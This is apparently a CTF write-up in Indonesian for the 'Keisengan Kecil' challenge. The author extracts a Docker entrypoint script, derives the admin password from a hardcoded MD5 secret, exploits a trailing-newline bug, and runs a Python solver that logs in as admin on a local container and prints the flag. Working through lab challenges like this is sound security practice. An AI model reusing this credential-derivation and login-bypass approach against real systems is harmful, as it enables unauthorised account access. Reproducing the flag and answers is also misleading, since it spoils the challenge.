# WriteUp - Keisengan Kecil

## Overview

* **Judul:** Keisengan Kecil
* **Kategori:** Injection
* **Poin:** 50
* **Deskripsi:** Ungkap rahasia admin. kredensial: `<username>:anyaunyu`
* **Author:** -
* **URL:** `http://localhost:1337`

## Attachment Information & Directory Structure

Konfigurasi awal lingkungan Docker dari file attachment `collabspace.yml`:

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/collabspace-web:latest
    ports:
      - "1337:80"
    environment:
      - PWN=${PWN:-player}
      - BASE_URL=http://localhost:1337

  victim:
    image: ghcr.io/hengkerrusia/collabspace-victim:latest
    environment:
      - APP_URL=http://web:80
      - VICTIM_USERNAME=admin
      - VISIT_INTERVAL_SECONDS=15
    depends_on:
      - web

```

Struktur source code pada kontainer `web`:

```bash
▶  docker exec keisengankecil-web-1 ls -la
total 28
drwxr-xr-x    1 root     root          4096 Mar  1 03:54 .
drwxr-xr-x    1 root     root          4096 Mar  1 03:54 ..
drwxr-xr-x   97 root     root          4096 Feb 23 12:22 node_modules
-rw-r--r--    1 root     root          7618 Feb 24 02:53 server.js
drwxr-xr-x    2 root     root          4096 Feb 24 14:49 uploads
drwxr-xr-x    2 root     root          4096 Feb 23 13:23 views

```

## Proses Penyelesaian

Secara teori, challenge ini dirancang dengan kerentanan **Stored XSS via Content-Type Spoofing** atau **Arbitrary File Write via Decoupled Validation & Path Traversal** pada fitur *upload* file. Namun, infrastruktur bot (victim) yang diberikan pada *attachment* lokal mengalami kegagalan *login* terus-menerus. Hal ini disebabkan kontainer `victim` tidak mendapatkan injeksi variabel *environment* `PWN` yang sama dengan kontainer `web`, sehingga *seed* pembuatan *password* admin menjadi tidak sinkron.

Untuk memecahkan challenge ini, pendekatan yang digunakan beralih ke *Reverse Engineering* infrastruktur Docker (Local Bypass) untuk mengekstrak kredensial admin secara langsung.

### 1. Ekstraksi Entrypoint Script

Alih-alih bergantung pada bot yang rusak, proses dimulai dengan membongkar bagaimana *password* admin dan *flag* di-*generate* di dalam *image* Docker. Kontainer sementara dibuat untuk menyalin file `/app/entrypoint.sh`.

```bash
▶  docker create --name tmp_web ghcr.io/hengkerrusia/collabspace-web:latest
▶  docker cp tmp_web:/app/entrypoint.sh ./entrypoint_orig.sh

```

Isi dari `entrypoint_orig.sh` membongkar seluruh logika rahasia di balik challenge ini:

```bash
#!/bin/sh
SECRET="makanberas"
PWN="${PWN:-player}"

# Admin password: derived from SECRET
ADMIN_PASSWORD=$(echo -n "${SECRET}_admin" | md5sum | awk '{print $1}')

# Generate flag from SECRET + PWN
HASH=$(echo -n "${SECRET}${PWN}" | md5sum | awk '{print $1}')
FLAG="pwn{${HASH}}"

echo $FLAG >> /dev/shm/.flag.txt
echo $ADMIN_PASSWORD >> /dev/shm/.admin_password.txt

```

### 2. Menemukan The Trailing Newline Bug

Berdasarkan `entrypoint_orig.sh`, *password* admin dibuat dengan melakukan *hashing* MD5 pada string `makanberas_admin`, yang menghasilkan `783fc0dcf7a4a124c828c182f002d2f9`.

Namun, terdapat sebuah *bug* kritis pada baris injeksi file:
`echo $ADMIN_PASSWORD >> /dev/shm/.admin_password.txt`
Perintah `echo` standar di bash akan secara otomatis menambahkan karakter baris baru (`\n`) di akhir output.

Pada file `server.js`, aplikasi membaca file ini menggunakan:
`const ADMIN_PASSWORD = fs.readFileSync('/dev/shm/.admin_password.txt', 'utf-8');`
Karena tidak ada fungsi `.trim()` yang dipanggil, nilai variabel `ADMIN_PASSWORD` di memori Node.js secara harfiah adalah `"783fc0dcf7a4a124c828c182f002d2f9\n"`.

### 3. Eksploitasi Lokal

Dengan berbekal informasi algoritma *hash* dan *bug trailing newline*, kita tidak memerlukan kontainer `victim` sama sekali. Kontainer web di-*restart* agar berjalan secara bersih. *Script* Python dirancang untuk mengalkulasi *hash* MD5 tersebut secara lokal, menambahkan karakter `\n`, lalu menembakkan *request* otentikasi langsung ke endpoint `/api/login` sebagai `admin`. Setelah mendapatkan sesi administrator, *request* dilanjutkan ke `/api/admin/secret` untuk menarik *flag*.

We got this bro! Strategi ini sepenuhnya mem-*bypass* kebutuhan interaksi bot CTF yang *broken*.

## Script Solver

```python
import requests
import hashlib

BASE_URL = "http://localhost:1337"
SECRET = "makanberas"

def exploit():
    print("[*] Starting CollabSpace Local Bypass Solver...")
    session = requests.Session()
    
    # 1. Kalkulasi password admin berdasarkan algoritma entrypoint
    raw_str = f"{SECRET}_admin".encode()
    admin_pass_hash = hashlib.md5(raw_str).hexdigest()
    
    # 2. Eksploitasi Trailing Newline Bug
    # fs.readFileSync membaca file beserta \n bawaan perintah 'echo' di bash
    admin_password = f"{admin_pass_hash}\n"
    
    print(f"[*] Computed Admin Password: {admin_pass_hash} (with trailing newline)")
    
    # 3. Login sebagai admin
    print("[*] 1. Logging in as 'admin'...")
    res = session.post(
        f"{BASE_URL}/api/login", 
        json={"username": "admin", "password": admin_password}
    )
    
    if not res.ok:
        print("[-] Login gagal! Cek kembali status container.")
        return
    print("[+] Login berhasil! Dapet session cookie admin.")
    
    # 4. Tarik Flag
    print("[*] 2. Accessing /api/admin/secret...")
    res_secret = session.get(f"{BASE_URL}/api/admin/secret")
    
    if res_secret.status_code == 200:
        secret_data = res_secret.json()
        print("\n========================================")
        print("[+] PWNED! Flag Extracted:")
        # Kita strip() biar \n di belakang flagnya ilang pas di-print
        print(secret_data.get('secret', '').strip())
        print("========================================\n")
    else:
        print("[-] Gagal mengekstrak flag.")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Script

```bash
▶  docker create --name tmp_web ghcr.io/hengkerrusia/collabspace-web:latest
2352e8f4ee6baa1c0f9168e665d07015a692ca3b09b9c15ba261c7cbbf872304

▶  docker cp tmp_web:/app/entrypoint.sh ./entrypoint_orig.sh
Successfully copied 2.56kB to /home/wanzkey/Pwn The Website/Input Injection/Keisengan Kecil/entrypoint_orig.sh

▶  cat entrypoint_orig.sh
#!/bin/sh

# CollabSpace Web Entrypoint

SECRET="makanberas"
PWN="${PWN:-player}"

# Admin password: derived from SECRET (deterministic so victim can compute it too)
ADMIN_PASSWORD=$(echo -n "${SECRET}_admin" | md5sum | awk '{print $1}')

# Member credentials: username = PWN, password = PWN
export MEMBER_USERNAME="${PWN}"
export MEMBER_PASSWORD="anyaunyu"

# Generate flag from SECRET + PWN
HASH=$(echo -n "${SECRET}${PWN}" | md5sum | awk '{print $1}')
FLAG="pwn{${HASH}}"

echo $FLAG >> /dev/shm/.flag.txt

echo $ADMIN_PASSWORD >> /dev/shm/.admin_password.txt

# Clean up sensitive vars
unset SECRET
unset HASH

# Remove self for security
rm -- "$0"

# Start the web server
exec node /app/server.js

▶  docker rm tmp_web
tmp_web

▶  PWN=WanZKey docker compose -f collabspace.yml down -v
[+] Running 4/4
 ✔ Container keisengankecil-victim-1  Removed                                                                                              0.2s
 ✔ Container keisengankecil-web-1     Removed                                                                                              0.1s
 ✔ Volume keisengankecil_shm_data     Removed                                                                                              0.0s
 ✔ Network keisengankecil_default     Removed                                                                                              0.5s

▶  PWN=WanZKey docker compose -f collabspace.yml up -d web &

[+] Running 3/3
 ✔ Network keisengankecil_default    Created                                                                                              0.5s
 ✔ Volume "keisengankecil_shm_data"  Created                                                                                              0.0s
 ✔ Container keisengankecil-web-1    Started                                                                                              2.5s

fish: Job 3, 'PWN=WanZKey docker compose -f c…' has ended

▶  docker ps
CONTAINER ID   IMAGE                                         COMMAND                  CREATED          STATUS          PORTS                                                                              NAMES
ff103a0f6a05   ghcr.io/hengkerrusia/collabspace-web:latest   "/app/entrypoint.sh"   18 seconds ago   Up 17 seconds   0.0.0.0:1337->80/tcp, [::]:1337->80/tcp                                            keisengankecil-web-1
36eec051c5e4   mailhog/mailhog:latest                        "MailHog"              7 days ago       Up 48 minutes   0.0.0.0:1025->1025/tcp, :::1025->1025/tcp, 0.0.0.0:8025->8025/tcp, :::8025->8025/tcp   gitforge-mailhog

▶  ./solver.py
[*] Starting CollabSpace Local Bypass Solver...
[*] Computed Admin Password: 783fc0dcf7a4a124c828c182f002d2f9 (with trailing newline)
[*] 1. Logging in as 'admin'...
[+] Login berhasil! Dapet session cookie admin.
[*] 2. Accessing /api/admin/secret...

========================================
[+] PWNED! Flag Extracted:
pwn{2957ce4f6b7435dc3e9857da920f1e8f}
========================================

```

## Flag

```
pwn{2957ce4f6b7435dc3e9857da920f1e8f}

```
